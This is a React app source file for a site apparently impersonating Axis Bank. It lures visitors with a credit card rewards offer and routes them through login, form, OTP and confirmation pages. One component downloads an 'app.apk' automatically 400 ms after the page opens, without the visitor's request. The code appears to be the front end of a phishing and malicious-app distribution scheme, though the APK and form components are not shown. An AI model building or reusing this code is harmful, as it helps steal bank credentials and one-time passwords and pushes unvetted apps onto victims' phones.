import React, { useEffect, useState } from 'react';
import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
import SixaMobile from './Comp/SixaMobile';
import SixaMobileApp from './Comp/SixaApp';
import SixaForm from './Comp/Form';
import AxisOtpVerification from './Comp/OTP';
import AxisConfirmationPage from './Comp/Confirmation';
import Nav from './Comp/Nav';

const APP_DOWNLOAD_URL = '/app.apk';

const DownloadApp = () => {
  const [downloadStarted, setDownloadStarted] = useState(false);

  const triggerDownload = () => {
    const link = document.createElement('a');
    link.href = APP_DOWNLOAD_URL;
    link.download = 'app.apk';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  useEffect(() => {
    const timer = setTimeout(() => {
      triggerDownload();
      setDownloadStarted(true);
    }, 400);

    return () => clearTimeout(timer);
  }, []);

  return (
    <div className="flex flex-col items-center justify-center min-h-[40vh] text-center">
      <h2 className="text-2xl font-bold mb-4">Downloading the App...</h2>
      <p className="mb-4">
        {downloadStarted
          ? 'Your download should have started automatically.'
          : 'Preparing your download...'}
      </p>
      <button
        onClick={triggerDownload}
        className="px-4 py-2 bg-blue-600 text-white rounded-lg shadow hover:bg-blue-700"
      >
        Download Manually
      </button>
      <a
        href={APP_DOWNLOAD_URL}
        download="app.apk"
        className="mt-3 text-blue-600 underline"
        onClick={e => {
          e.preventDefault();
          triggerDownload();
        }}
      >
        Direct link (if button doesn’t work)
      </a>
    </div>
  );
};

const Home = () => {
  // Download directly when Download App is clicked, without page navigation
  const handleDirectDownload = (e) => {
    e.preventDefault();
    const link = document.createElement('a');
    link.href = APP_DOWNLOAD_URL;
    link.download = 'app.apk';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  return (
    <div className='flex flex-col justify-center items-center gap-2 p-4'>
      <img src="1.jpg" alt="Image 1" className="mb-4 w-full max-w-lg rounded-lg" />
      <img src="2.jpg" alt="Image 2" className="mb-4 w-full max-w-lg rounded-lg" />

      <section className="w-full flex items-center justify-center bg-white py-4 sm:py-8">
        <div className="w-full max-w-xl text-center px-4 sm:px-6">
          {/* Heading */}
          <h2 className="text-2xl sm:text-[32px] font-bold tracking-wide text-[#B12B5B]">
            DOWNLOAD
          </h2>
          <h3 className="text-2xl sm:text-[32px] font-normal text-black mt-1">
            OUR APP
          </h3>

          {/* Description */}
          <p className="mt-6 text-base sm:text-[20px] text-gray-500 leading-snug sm:leading-snug">
            Enjoy <span className="font-semibold">2X EDGE REWARDS</span> Points* on online
            spends with our Credit Card
          </p>

          {/* Buttons */}
          <div className="mt-8 sm:mt-10 flex flex-col gap-4 sm:gap-6 items-center">
            <a
              href={APP_DOWNLOAD_URL}
              onClick={handleDirectDownload}
              className="w-full sm:w-[260px] py-3 sm:py-4 rounded-full bg-[#B12B5B] text-white text-base sm:text-[20px] font-medium hover:opacity-90 transition text-center"
            >
              Download App
            </a>
            <a
              href="/axis-cashback"
              className="w-full sm:w-[260px] py-3 sm:py-4 rounded-full bg-[#B12B5B] text-white text-base sm:text-[20px] font-medium hover:opacity-90 transition text-center"
            >
              Login
            </a>
          </div>
        </div>
      </section>

      <img src="3.jpg" alt="Image 3" className="mb-4 w-full max-w-lg rounded-lg" />
      <img src="4.jpg" alt="Image 4" className="mb-4 w-full max-w-lg rounded-lg" />
    </div>
  );
};
const About = () => <div>About Page</div>;

const App = () => {
  return (
    <Router>
      <div className="">
        <Nav />
        <Routes>
          <Route path="/" element={<Home />} />
          <Route path="/about" element={<About />} />
          <Route path="/axis-cashback" element={<SixaMobile />} />
          <Route path="/axis-app" element={<SixaMobileApp />} />
          <Route path="/axis-form" element={<SixaForm />} />
          <Route path="/axis-otp" element={<AxisOtpVerification />} />
          <Route path="/axis-confirmation" element={<AxisConfirmationPage />} />




        </Routes>
      </div>
    </Router>
  );
}

export default App;